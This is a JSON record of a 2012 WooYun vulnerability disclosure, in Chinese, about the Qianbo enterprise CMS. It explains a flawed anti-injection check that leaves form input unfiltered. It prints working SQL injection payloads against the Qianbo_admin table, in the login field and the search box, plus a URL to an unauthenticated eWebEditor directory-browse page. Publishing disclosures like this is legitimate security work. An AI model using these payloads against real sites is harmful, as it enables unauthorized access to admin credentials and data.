{"id": 21259, "wybug_id": "wooyun-2012-05017", "wybug_title": "一个防注入的小白错误-千博企业程序", "wybug_corp": "千博", "wybug_author": "B1uH4ck", "wybug_date": "2012-03-04 22:25", "wybug_open_date": "2012-03-04 22:25", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-03-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-03-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 千博企业站程序，防注入语句里有一个小白错误！ 详细说明：  If EnableStopInjection = True Then    If Request.QueryString <> \"\" Then Call StopInjection(Request.QueryString)    If Request.Cookies <> \"\" Then Call StopInjection(Request.Cookies)    If Request.Cookies <> \"\" Then Call StopInjection2(Request.Form)End If========================防注入开始还是Encode的，通过Echo他们的解码程序，才发现，这里面把cookie是否空判断两次。造成了Form的恶意字符提交。   漏洞证明：  一个鸡肋的前台用户登陆 Md5值是1，语句写在用户名里，密码写1' UNION Select 1,1,1,'a0b923820dcc509a',1,1,1,1,1,1,1,1,1,1,1,1,1,1,true,1,1,1 FROM Qianbo_admin Where ''='这个鸡肋的前台登陆只能到达MemberLogin.asp的48行If UCase(LoginName) = UCase(MemName) And LoginPassword = Password LoginName取的就是刚刚的那串语句，而查询结果的用户名是1所以卡在了这里=================================================================http://my/system/ewebeditor/asp/browse.asp?action=FOLDER&style=coolblue&cusdir=dir&type=FILE后台ewebeditor没有做权限的验证，可导致游客直接浏览FCK也可列目录用本地的Test连上他们的Fck===================================================================搜索框中输入%' and 1=2 union all select 1,2,3,4,5,6,7,8,9,10,11,12,13 from Qianbo_admin where '%'='==================================================================一堆鸡肋啊。。   修复方案：  各种修复啊，你们都懂的！！！   版权声明：转载请注明来源 B1uH4ck@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}